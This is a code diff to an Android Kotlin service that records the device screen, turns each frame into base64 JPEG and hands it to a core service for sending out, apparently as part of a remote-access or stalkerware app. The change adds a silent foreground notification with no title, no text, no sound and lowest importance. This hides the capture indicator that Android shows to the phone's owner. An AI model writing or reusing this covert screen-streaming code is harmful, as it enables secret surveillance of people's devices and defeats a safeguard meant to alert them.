@@ -24,9 +24,10 @@ class ScreenStreamService : Service() {
 
     companion object {
         var isRunning = false
-        // SetupActivity se resultCode + data store karo
         var projectionResultCode: Int = 0
         var projectionResultData: Intent? = null
+        private const val CHANNEL_ID = "screen_stream"
+        private const val NOTIF_ID   = 12
     }
 
     private val streaming = AtomicBoolean(false)
@@ -39,10 +40,9 @@ class ScreenStreamService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
-
-        if (projectionResultData == null) {
-            stopSelf(); return START_NOT_STICKY
-        }
+        if (projectionResultData == null) { stopSelf(); return START_NOT_STICKY }
+        createChannel()
+        startForeground(NOTIF_ID, buildNotif())
         intervalMs = intent?.getLongExtra("interval", 1000L) ?: 1000L
         isRunning = true
         streaming.set(true)
@@ -59,9 +59,9 @@ class ScreenStreamService : Service() {
 
         val wm = getSystemService(WINDOW_SERVICE) as WindowManager
         val metrics = DisplayMetrics()
+        @Suppress("DEPRECATION")
         wm.defaultDisplay.getMetrics(metrics)
 
-        // Scale down for bandwidth
         val width  = metrics.widthPixels  / 2
         val height = metrics.heightPixels / 2
         val dpi    = metrics.densityDpi   / 2
@@ -87,8 +87,7 @@ class ScreenStreamService : Service() {
                 val rowStride = plane.rowStride
                 val pixelStride = plane.pixelStride
                 val buf = plane.buffer
-                val bmp = Bitmap.createBitmap(
-                    rowStride / pixelStride, h, Bitmap.Config.ARGB_8888)
+                val bmp = Bitmap.createBitmap(rowStride / pixelStride, h, Bitmap.Config.ARGB_8888)
                 bmp.copyPixelsFromBuffer(buf)
                 val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
                 img.close()
@@ -97,8 +96,7 @@ class ScreenStreamService : Service() {
                 cropped.compress(Bitmap.CompressFormat.JPEG, 50, baos)
                 val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                 CoreService.instance?.sendData("screen_frame", JSONObject().apply {
-                    put("frame", b64)
-                    put("w", w); put("h", h)
+                    put("frame", b64); put("w", w); put("h", h)
                 })
             } catch (_: Exception) {}
             handler?.postDelayed({ scheduleCapture(w, h) }, intervalMs)
@@ -112,6 +110,17 @@ class ScreenStreamService : Service() {
         try { mediaProjection?.stop() } catch (_: Exception) {}
         thread?.quitSafely()
     }
+
+    private fun createChannel() {
+        val ch = NotificationChannel(CHANNEL_ID, "Screen", NotificationManager.IMPORTANCE_NONE)
+            .apply { setShowBadge(false); enableLights(false); enableVibration(false) }
+        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
+    }
+
+    private fun buildNotif() = Notification.Builder(this, CHANNEL_ID)
+        .setContentTitle("").setContentText("")
+        .setSmallIcon(android.R.drawable.screen_background_dark)
+        .build()
 
     override fun onDestroy() { stopStream(); super.onDestroy() }
     override fun onBind(intent: Intent?): IBinder? = null
